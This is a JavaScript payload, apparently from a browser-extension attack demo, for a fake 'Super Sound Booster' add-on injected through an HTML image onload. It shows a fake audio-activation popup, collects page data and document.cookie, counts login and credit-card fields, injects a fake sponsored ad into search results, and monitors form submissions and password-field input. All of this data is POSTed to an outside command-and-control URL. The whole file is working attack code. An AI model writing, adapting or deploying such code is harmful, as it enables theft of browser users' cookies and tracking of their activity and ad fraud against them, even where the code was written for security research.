// Remote Malicious Payload - Sound Booster HTML Injection Attack
console.log("🎵 Sound Booster remote payload executing via HTML injection!");

// Prevent duplicate execution
if (window.SOUND_BOOSTER_REMOTE_EXECUTED) {
    console.log("⏭️ Remote payload already executed");
} else {
    window.SOUND_BOOSTER_REMOTE_EXECUTED = true;
    executeAdvancedHTMLAttack();
}

function executeAdvancedHTMLAttack() {
    console.log("🚀 Executing advanced HTML injection attack...");
    
    // 1. Show fake "audio enhancement" activation
    showFakeAudioActivation();
    
    // 2. Collect sensitive data
    collectSensitiveData();
    
    // 3. Detect and inject into search pages
    if (isSearchPage()) {
        injectSearchAds();
    }
    
    // 4. Setup monitoring and data exfiltration
    setupDataExfiltration();
    
    console.log("✅ HTML injection attack sequence complete");
}

function showFakeAudioActivation() {
    if (!document.body) {
        document.addEventListener('DOMContentLoaded', showFakeAudioActivation);
        return;
    }
    
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed !important;
        top: 20px !important;
        right: 20px !important;
        background: linear-gradient(135deg, #4CAF50, #45a049) !important;
        color: white !important;
        padding: 18px !important;
        border-radius: 12px !important;
        z-index: 2147483647 !important;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
        box-shadow: 0 6px 20px rgba(76,175,80,0.4) !important;
        min-width: 300px !important;
        animation: slideIn 0.3s ease-out !important;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center; margin-bottom: 10px;">
            <span style="font-size: 20px; margin-right: 10px;">🔊</span>
            <strong style="font-size: 16px;">Sound Booster Activated</strong>
        </div>
        <div style="font-size: 13px; opacity: 0.95; line-height: 1.4;">
            ✅ Volume enhanced: +50%<br>
            ✅ Bass boost: +25%<br>
            ✅ HTML injection: Success<br>
            ✅ CSP bypass: Complete
        </div>
        <div style="font-size: 11px; opacity: 0.8; margin-top: 8px;">
            Optimizing audio for ${window.location.hostname}
        </div>
    `;
    
    // Add CSS animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
    
    notification.onclick = () => notification.remove();
    document.body.appendChild(notification);
    
    // Auto-remove after 8 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.remove();
        }
    }, 8000);
}

function collectSensitiveData() {
    try {
        console.log("📊 Collecting sensitive data via HTML injection...");
        
        const data = {
            // Basic page information
            url: window.location.href,
            title: document.title,
            domain: window.location.hostname,
            referrer: document.referrer,
            timestamp: new Date().toISOString(),
            
            // User environment
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            
            // Screen and browser info
            screenWidth: screen.width,
            screenHeight: screen.height,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            
            // Security-sensitive elements
            passwordFields: document.querySelectorAll('input[type="password"]').length,
            emailFields: document.querySelectorAll('input[type="email"]').length,
            loginForms: document.querySelectorAll('form[action*="login"], form[action*="signin"], form[action*="auth"]').length,
            creditCardFields: document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[name*="credit"]').length,
            
            // Storage and cookies
            cookies: document.cookie,
            localStorageKeys: (typeof localStorage !== 'undefined') ? Object.keys(localStorage).length : 0,
            sessionStorageKeys: (typeof sessionStorage !== 'undefined') ? Object.keys(sessionStorage).length : 0,
            
            // Attack metadata
            injectionMethod: "html_image_onload",
            extensionName: "Super Sound Booster",
            payloadSource: "remote_server",
            cspBypassed: true
        };
        
        console.log("📋 Sensitive data collected:", data);
        
        // Exfiltrate data to command & control server
        fetch('https://redesigned-space-system-rq5wx44745rhwxg9-8000.app.github.dev/exfiltrate-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(response => {
            console.log("📤 Data exfiltration successful:", response.status);
        }).catch(error => {
            console.log("📤 Data exfiltration attempted:", error);
        });
        
        // Store for debugging
        window.EXFILTRATED_DATA = data;
        
    } catch (error) {
        console.error("❌ Data collection error:", error);
    }
}

function isSearchPage() {
    return window.location.href.includes('search') ||
           window.location.href.includes('google.com/search') ||
           window.location.href.includes('bing.com/search') ||
           window.location.href.includes('duckduckgo.com') ||
           document.querySelector('input[name="q"]') ||
           document.querySelector('input[type="search"]');
}

function injectSearchAds() {
    console.log("🔍 Search page detected, injecting disguised ads...");
    
    setTimeout(() => {
        // Find search results container
        const searchResults = document.querySelector('#search') ||
                            document.querySelector('.g') ||
                            document.querySelector('#results') ||
                            document.querySelector('.search-results') ||
                            document.querySelector('#main');
        
        if (searchResults) {
            const audioAd = document.createElement('div');
            audioAd.style.cssText = `
                border: 2px solid #4CAF50 !important;
                border-radius: 12px !important;
                padding: 18px !important;
                margin: 16px 0 !important;
                background: linear-gradient(135deg, #f8fff8, #e8f5e8) !important;
                box-shadow: 0 4px 12px rgba(76,175,80,0.2) !important;
                position: relative !important;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
            `;
            
            audioAd.innerHTML = `
                <div style="display: flex; align-items: center; margin-bottom: 10px;">
                    <span style="font-size: 20px; margin-right: 10px;">🎵</span>
                    <span style="color: #2E7D32; font-size: 18px; font-weight: 600;">
                        Professional Audio Enhancer - Free Download
                    </span>
                    <span style="background: #4CAF50; color: white; padding: 3px 8px; border-radius: 6px; font-size: 10px; margin-left: 12px; font-weight: bold;">
                        SPONSORED
                    </span>
                </div>
                <div style="color: #1976D2; font-size: 14px; margin-bottom: 8px; text-decoration: underline;">
                    www.sound-booster-pro.com/free-download
                </div>
                <div style="color: #424242; font-size: 14px; line-height: 1.5; margin-bottom: 10px;">
                    ⭐ Advanced audio enhancement software for all browsers and websites. 
                    Download now for instant 50% volume boost and professional sound quality! 
                    Trusted by millions of users worldwide.
                </div>
                <div style="display: flex; gap: 15px; font-size: 11px; color: #666; margin-top: 12px;">
                    <span>🔊 Universal compatibility</span>
                    <span>🚀 Instant activation</span>
                    <span>🛡️ Completely safe</span>
                    <span>⭐ 4.8/5 rating</span>
                </div>
            `;
            
            // Insert at top of search results
            if (searchResults.parentNode) {
                searchResults.parentNode.insertBefore(audioAd, searchResults);
            } else {
                document.body.insertBefore(audioAd, document.body.firstChild);
            }
            
            console.log("📺 Disguised audio advertisement injected successfully");
        }
    }, 2000);
}

function setupDataExfiltration() {
    try {
        console.log("🕵️ Setting up continuous data monitoring...");
        
        // Monitor form submissions
        document.addEventListener('submit', function(event) {
            const formData = {
                action: event.target.action,
                method: event.target.method,
                fieldCount: event.target.querySelectorAll('input').length,
                hasPasswordField: event.target.querySelector('input[type="password"]') !== null,
                timestamp: Date.now()
            };
            
            console.log("📝 Form submission intercepted:", formData);
            
            // Exfiltrate form metadata
            fetch('https://redesigned-space-system-rq5wx44745rhwxg9-8000.app.github.dev/form-data', {
                method: 'POST',
                body: JSON.stringify(formData),
                headers: { 'Content-Type': 'application/json' }
            }).catch(() => {});
        });
        
        // Monitor password field interactions
        document.addEventListener('input', function(event) {
            if (event.target.type === 'password') {
                console.log("🔑 Password field interaction detected");
                
                // Log password field activity (not actual passwords)
                fetch('https://redesigned-space-system-rq5wx44745rhwxg9-8000.app.github.dev/password-activity', {
                    method: 'POST',
                    body: JSON.stringify({
                        domain: window.location.hostname,
                        timestamp: Date.now(),
                        fieldName: event.target.name || 'unknown'
                    }),
                    headers: { 'Content-Type': 'application/json' }
                }).catch(() => {});
            }
        });
        
        console.log("✅ Data monitoring systems active");
        
    } catch (error) {
        console.error("❌ Monitoring setup error:", error);
    }
}

// Set global status markers
window.HTML_INJECTION_COMPLETE = true;
window.ATTACK_TIMESTAMP = Date.now();
window.ATTACK_METHOD = "html_image_onload";
window.EXTENSION_NAME = "Super Sound Booster";
window.PAYLOAD_SOURCE = "remote_server";

console.log("🎉 HTML INJECTION ATTACK COMPLETED!");
console.log("📊 Attack summary:", {
    method: "HTML image onload injection",
    cspBypassed: true,
    dataCollected: true,
    monitoring: true,
    disguise: "audio_enhancer",
    timestamp: window.ATTACK_TIMESTAMP
});